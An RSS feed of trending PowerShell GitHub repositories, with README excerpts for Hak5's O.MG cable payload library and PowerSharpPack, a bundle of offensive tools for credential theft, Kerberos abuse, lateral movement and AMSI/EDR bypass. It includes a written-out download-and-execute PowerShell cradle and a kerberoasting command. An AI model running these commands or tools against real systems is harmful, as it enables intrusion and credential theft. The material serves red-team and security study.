<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub PowerShell Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-06-11T01:58:16Z</updated>
  <subtitle>Daily Trending of PowerShell in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>hak5/omg-payloads</title>
    <updated>2022-06-11T01:58:16Z</updated>
    <id>tag:github.com,2022-06-11:/hak5/omg-payloads</id>
    <link href="https://github.com/hak5/omg-payloads" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Payload Library for O.MG Devices&lt;/h1&gt; &#xA;&lt;p&gt;This repository contains payloads and extensions for O.MG Devices. Community developed payloads are listed and developers are encouraged to create pull requests to make changes to or submit new payloads.&lt;/p&gt; &#xA;&lt;h2&gt;About the O.MG Cable&lt;/h2&gt; &#xA;&lt;p&gt;To get a cable like this, you used to need a million dollar budget or to find a guy named MG at DEFCON. But Hak5 teamed up with MG to allow more people access to this previously clandestine attack hardware.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://shop.hak5.org/collections/mischief-gadgets/&#34;&gt;Purchase at Hak5&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/O-MG/O.MG_Cable-Firmware/wiki&#34;&gt;Documentation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://hak5.org/discord&#34;&gt;Discord&lt;/a&gt; (Join #omg-support)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://cdn.shopify.com/s/files/1/0068/2142/files/omg_400x.png?v=1604676891&#34; alt=&#34;OMG Cable&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;p&gt;Documentation on developing payloads for the OMG Cable can be found on the &lt;a href=&#34;https://github.com/O-MG/O.MG_Cable-Firmware/wiki&#34;&gt;OMG Wiki&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Disclaimer&lt;/h2&gt; &#xA;&lt;p&gt;Generally, payloads may execute commands on your device or target. As such, it is possible for a payload to damage your device or target. Payloads from this repository are provided AS-IS without warranty. While Hak5 makes a best effort to review payloads, there are no guarantees as to their effectiveness. As with any script, you are advised to proceed with caution.&lt;/p&gt; &#xA;&lt;h2&gt;Legal&lt;/h2&gt; &#xA;&lt;p&gt;Payloads from this repository are provided for educational purposes only. Hak5 gear is intended for authorized auditing and security analysis purposes only where permitted subject to local and international laws where applicable. Users are solely responsible for compliance with all laws of their locality. Hak5 LLC and affiliates claim no responsibility for unauthorized or unlawful use.&lt;/p&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;Once you have developed your payload, you are encouraged to contribute to this repository by submitting a Pull Request. Reviewed and Approved pull requests will add your payload to this repository, where they may be publically available.&lt;/p&gt; &#xA;&lt;p&gt;Please adhere to the following best practices and style guide when submitting a payload.&lt;/p&gt; &#xA;&lt;h3&gt;Naming Conventions&lt;/h3&gt; &#xA;&lt;p&gt;Please give your payload a unique and descriptive name. Do not use spaces in payload names. Each payload should be submit into its own directory, with &lt;code&gt;-&lt;/code&gt; or &lt;code&gt;_&lt;/code&gt; used in place of spaces, to one of the categories such as exfiltration, phishing, remote_access or recon. Do not create your own category.&lt;/p&gt; &#xA;&lt;h3&gt;Comments&lt;/h3&gt; &#xA;&lt;p&gt;Payloads should begin with comments specifying at the very least the name of the payload and author. Additional information such as a brief description, the target, any dependencies / prerequisites and the LED status used is helpful.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;REM Title: FTP Exfiltrator&#xA;REM Description: Exfiltrates files from %userprofile%\documents via FTP&#xA;REM Author: Hak5Darren&#xA;REM Target: Windows XP SP3 - Latest&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>S3cur3Th1sSh1t/PowerSharpPack</title>
    <updated>2022-06-11T01:58:16Z</updated>
    <id>tag:github.com,2022-06-11:/S3cur3Th1sSh1t/PowerSharpPack</id>
    <link href="https://github.com/S3cur3Th1sSh1t/PowerSharpPack" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;PowerSharpPack&lt;/h1&gt; &#xA;&lt;p&gt;Many usefull offensive CSharp Projects wraped into Powershell for easy usage.&lt;/p&gt; &#xA;&lt;p&gt;Why? In my personal opinion offensive Powershell is not dead because of AMSI, Script-block-logging, Constrained Language Mode or other protection features. Any of these mechanisms can be bypassed. Since most new innovative offensive security projects are written in C# I decided to make them usable in powershell as well.&lt;/p&gt; &#xA;&lt;p&gt;So what did i basically do here?&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;First of all clone each C# Repo.&lt;/li&gt; &#xA; &lt;li&gt;Set the class and main methods public&lt;/li&gt; &#xA; &lt;li&gt;For some projects i merged pull requests with new features or bug fixes or i had to remove environment.exit statements so that the whole powershell process is not killed for missing parameters and so on&lt;/li&gt; &#xA; &lt;li&gt;Afterwards compiling each binary&lt;/li&gt; &#xA; &lt;li&gt;Gzip-compress and base64-Encode the compiled binary base64 and load it in powershell via &lt;code&gt;[System.Reflection.Assembly]::Load($DecompressedDecodedBinary)&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Its a very easy but for many repos time consuming process.&lt;/p&gt; &#xA;&lt;p&gt;Which tools are included?&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Internalmonologue&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/eladshamir/Internal-Monologue&#34;&gt;https://github.com/eladshamir/Internal-Monologue&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Seatbelt&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Seatbelt is a C# project that performs a number of security oriented host-survey &#34;safety checks&#34; relevant from both offensive and defensive security perspectives.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/GhostPack/Seatbelt&#34;&gt;https://github.com/GhostPack/Seatbelt&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpWeb&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;.NET 2.0 CLR project to retrieve saved browser credentials from Google Chrome, Mozilla Firefox and Microsoft Internet Explorer/Edge.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/djhohnstein/SharpWeb&#34;&gt;https://github.com/djhohnstein/SharpWeb&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;UrbanBishop&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Creates a local RW section in UrbanBishop and then maps that section as RX into a remote process. Shellcode loading made easy.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/FuzzySecurity/Sharp-Suite&#34;&gt;https://github.com/FuzzySecurity/Sharp-Suite&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpUp&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;SharpUp is a C# port of various PowerUp functionality.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/GhostPack/SharpUp&#34;&gt;https://github.com/GhostPack/SharpUp&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Rubeus&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Rubeus is a C# toolset for raw Kerberos interaction and abuses.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/GhostPack/Rubeus&#34;&gt;https://github.com/GhostPack/Rubeus&lt;/a&gt; &amp;amp;&amp;amp; &lt;a href=&#34;https://github.com/gentilkiwi/kekeo/&#34;&gt;https://github.com/gentilkiwi/kekeo/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharPersist&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Windows persistence toolkit written in C#.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/fireeye/SharPersist&#34;&gt;https://github.com/fireeye/SharPersist&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Sharpview&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;C# implementation of harmj0y&#39;s PowerView&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/tevora-threat/SharpView&#34;&gt;https://github.com/tevora-threat/SharpView&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;winPEAS&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Check the Local Windows Privilege Escalation checklist from book.hacktricks.xyz&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS&#34;&gt;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Lockless&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Lockless allows for the copying of locked files.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/GhostPack/Lockless&#34;&gt;https://github.com/GhostPack/Lockless&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpChromium&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;.NET 4.0 CLR Project to retrieve Chromium data, such as cookies, history and saved logins.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/djhohnstein/SharpChromium&#34;&gt;https://github.com/djhohnstein/SharpChromium&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpDPAPI&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;SharpDPAPI is a C# port of some Mimikatz DPAPI functionality.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/GhostPack/SharpDPAPI&#34;&gt;https://github.com/GhostPack/SharpDPAPI&lt;/a&gt; &amp;amp;&amp;amp; &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz/&#34;&gt;https://github.com/gentilkiwi/mimikatz/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpShares&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Enumerate all network shares in the current domain. Also, can resolve names to IP addresses.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/djhohnstein/SharpShares&#34;&gt;https://github.com/djhohnstein/SharpShares&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpSniper&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Find specific users in active directory via their username and logon IP address&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/HunnicCyber/SharpSniper&#34;&gt;https://github.com/HunnicCyber/SharpSniper&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpSpray&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;SharpSpray a simple code set to perform a password spraying attack against all users of a domain using LDAP and is compatible with Cobalt Strike.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/jnqpblc/SharpSpray&#34;&gt;https://github.com/jnqpblc/SharpSpray&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Watson&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Enumerate missing KBs and suggest exploits for useful Privilege Escalation vulnerabilities&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/rasta-mouse/Watson&#34;&gt;https://github.com/rasta-mouse/Watson&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Grouper2&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Find vulnerabilities in AD Group Policy&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/l0ss/Grouper2&#34;&gt;https://github.com/l0ss/Grouper2&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Tokenvator&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;A tool to elevate privilege with Windows Tokens&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/0xbadjuju/Tokenvator&#34;&gt;https://github.com/0xbadjuju/Tokenvator&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SauronEye&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Search tool to find specific files containing specific words, i.e. files containing passwords.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/vivami/SauronEye&#34;&gt;https://github.com/vivami/SauronEye&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Just load the main script with&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;iex(new-object net.webclient).downloadstring(&#39;https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1&#39;)&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;and choose the tool as switch parameter for example:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;PowerSharpPack -seatbelt -Command &#34;AMSIProviders&#34;&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/S3cur3Th1sSh1t/PowerSharpPack/raw/master/images/Example.JPG&#34; alt=&#34;alt text&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;If you want to pass multiple parameters to the binary you can just use quotation marks like:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;PowerSharpPack -Rubeus -Command &#34;kerberoast /outfile:Roasted.txt&#34;&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;If you dont want to load all binaries for reasons you can use the per binary Powershell scripts located in the PowerSharpBinaries folder.&lt;/p&gt; &#xA;&lt;p&gt;Projects which are also available as standalone powershell script:&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpCloud&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Simple C# for checking for the existence of credential files related to AWS, Microsoft Azure, and Google Compute.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/chrismaddalena/SharpCloud&#34;&gt;https://github.com/chrismaddalena/SharpCloud&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpSSDP&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;SSDP Service Discovery&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/rvrsh3ll/SharpSSDP&#34;&gt;https://github.com/rvrsh3ll/SharpSSDP&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;DAFT&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;DAFT: Database Audit Framework &amp;amp; Toolkit&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/NetSPI/DAFT&#34;&gt;https://github.com/NetSPI/DAFT&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Get-RBCD-Threaded&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Tool to discover Resource-Based Constrained Delegation attack paths in Active Directory environments&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/FatRodzianko/Get-RBCD-Threaded&#34;&gt;https://github.com/FatRodzianko/Get-RBCD-Threaded&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpGPO-RemoteAccessPolicies&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;A C# tool for enumerating remote access policies through group policy.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/FSecureLABS/SharpGPO-RemoteAccessPolicies&#34;&gt;https://github.com/FSecureLABS/SharpGPO-RemoteAccessPolicies&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpAllowedToAct&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Computer object takeover through Resource-Based Constrained Delegation (msDS-AllowedToActOnBehalfOfOtherIdentity)&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/pkb1s/SharpAllowedToAct&#34;&gt;https://github.com/pkb1s/SharpAllowedToAct&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;WireTap&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;.NET 4.0 Project to interact with video, audio and keyboard hardware.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/djhohnstein/WireTap&#34;&gt;https://github.com/djhohnstein/WireTap&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpClipboard&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;C# Clipboard Monitor&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/slyd0g/SharpClipboard&#34;&gt;https://github.com/slyd0g/SharpClipboard&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpPrinter&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Discover Printers + check for vulns&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/rvrsh3ll/SharpPrinter&#34;&gt;https://github.com/rvrsh3ll/SharpPrinter&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpHide&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Tool to create hidden registry keys.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/outflanknl/SharpHide&#34;&gt;https://github.com/outflanknl/SharpHide&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SpoolSample&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;PoC tool to coerce Windows hosts authenticate to other machines via the MS-RPRN RPC interface. This is possible via other protocols as well.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/leechristensen/SpoolSample&#34;&gt;https://github.com/leechristensen/SpoolSample&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpGPOAbuse&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;SharpGPOAbuse is a .NET application written in C# that can be used to take advantage of a user&#39;s edit rights on a Group Policy Object (GPO) in order to compromise the objects that are controlled by that GPO.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/FSecureLABS/SharpGPOAbuse&#34;&gt;https://github.com/FSecureLABS/SharpGPOAbuse&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpDump&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;SharpDump is a C# port of PowerSploit&#39;s Out-Minidump.ps1 functionality.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/GhostPack/SharpDump&#34;&gt;https://github.com/GhostPack/SharpDump&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpHound3&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;C# Data Collector for the BloodHound Project, Version 3&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/BloodHoundAD/SharpHound3&#34;&gt;https://github.com/BloodHoundAD/SharpHound3&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpLocker&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;SharpLocker helps get current user credentials by popping a fake Windows lock screen, all output is sent to Console which works perfect for Cobalt Strike.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/Pickfordmatt/SharpLocker&#34;&gt;https://github.com/Pickfordmatt/SharpLocker&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Eyewitness&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;EyeWitness is designed to take screenshots of websites, provide some server header info, and identify default credentials if possible.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/FortyNorthSecurity/EyeWitness&#34;&gt;https://github.com/FortyNorthSecurity/EyeWitness&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;FakeLogonScreen&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Fake Windows logon screen to steal passwords&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/bitsadmin/fakelogonscreen&#34;&gt;https://github.com/bitsadmin/fakelogonscreen&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;P0wnedShell&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;PowerShell Runspace Post Exploitation Toolkit&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/Cn33liz/p0wnedShell&#34;&gt;https://github.com/Cn33liz/p0wnedShell&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Safetykatz&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;SafetyKatz is a combination of slightly modified version of @gentilkiwi&#39;s Mimikatz project and @subTee&#39;s .NET PE Loader I modified this one again with my own obfuscated Mimikatz Version.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/GhostPack/SafetyKatz&#34;&gt;https://github.com/GhostPack/SafetyKatz&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;InveighZero&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Windows C# LLMNR/mDNS/NBNS/DNS/DHCPv6 spoofer/man-in-the-middle tool .&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/Kevin-Robertson/InveighZero&#34;&gt;https://github.com/Kevin-Robertson/InveighZero&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpSploit&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;SharpSploit is a .NET post-exploitation library written in C#.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/cobbr/SharpSploit&#34;&gt;https://github.com/cobbr/SharpSploit&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Snaffler&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;A tool for pentesters to help find delicious candy, by @l0ss and @Sh3r4 ( Twitter: @/mikeloss and @/sh3r4_hax ).&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/SnaffCon/Snaffler&#34;&gt;https://github.com/SnaffCon/Snaffler&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;BadPotato&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;itm4ns Printspoofer in C#.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/BeichenDream/BadPotato&#34;&gt;https://github.com/BeichenDream/BadPotato&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;BetterSafetyKatz&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Fork of SafetyKatz that dynamically fetches the latest pre-compiled release of Mimikatz directly from gentilkiwi GitHub repo, runtime patches signatures and uses SharpSploit DInvoke to PE-Load into memory.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/Flangvik/BetterSafetyKatz&#34;&gt;https://github.com/Flangvik/BetterSafetyKatz&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpKatz&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;C# Port of mimikatz sekurlsa::logonpasswords, sekurlsa::ekeys and lsadump::dcsync commands.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/b4rtik/SharpKatz&#34;&gt;https://github.com/b4rtik/SharpKatz&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Gopher&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;C# tool to discover low hanging fruits.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/EncodeGroup/Gopher&#34;&gt;https://github.com/EncodeGroup/Gopher&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpOxidResolver&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;IOXIDResolver from AirBus Security/PingCastle.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/vletoux/pingcastle/&#34;&gt;https://github.com/vletoux/pingcastle/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpBlock&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;A method of bypassing EDR&#39;s active projection DLL&#39;s by preventing entry point exection.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/CCob/SharpBlock&#34;&gt;https://github.com/CCob/SharpBlock&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpLoginPrompt&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;This Program creates a login prompt to gather username and password of the current user. This project allows red team to phish username and password of the current user without touching lsass and having adminitrator credentials on the system.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/shantanu561993/SharpLoginPrompt&#34;&gt;https://github.com/shantanu561993/SharpLoginPrompt&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;ThunderFox&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Retrieves data (contacts, emails, history, cookies and credentials) from Thunderbird and Firefox.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/V1V1/SharpScribbles&#34;&gt;https://github.com/V1V1/SharpScribbles&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;StickyNotesExtract&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Extracts data from the Windows Sticky Notes database. Works on Windows 10 Build 1607 and higher. This project doesn&#39;t rely on any external dependencies.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/V1V1/SharpScribbles&#34;&gt;https://github.com/V1V1/SharpScribbles&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SCShell&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Fileless lateral movement tool that relies on ChangeServiceConfigA to run command.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/Mr-Un1k0d3r/SCShell&#34;&gt;https://github.com/Mr-Un1k0d3r/SCShell&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpSecDump&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;.Net port of the remote SAM + LSA Secrets dumping functionality of impacket&#39;s secretsdump.py.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/G0ldenGunSec/SharpSecDump&#34;&gt;https://github.com/G0ldenGunSec/SharpSecDump&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpHandler&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;This project reuses open handles to lsass to parse or minidump lsass, therefore you don&#39;t need to use your own lsass handle to interact with it.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/jfmaes/SharpHandler&#34;&gt;https://github.com/jfmaes/SharpHandler&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpRDP&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Remote Desktop Protocol .NET Console Application for Authenticated Command Execution.&lt;/p&gt; &#xA;&lt;p&gt;@Credit to: &lt;a href=&#34;https://github.com/0xthirteen/SharpRDP&#34;&gt;https://github.com/0xthirteen/SharpRDP&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;SharpMove&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;.NET Project for performing Authenticated Remote Execution.&lt;/p&gt; 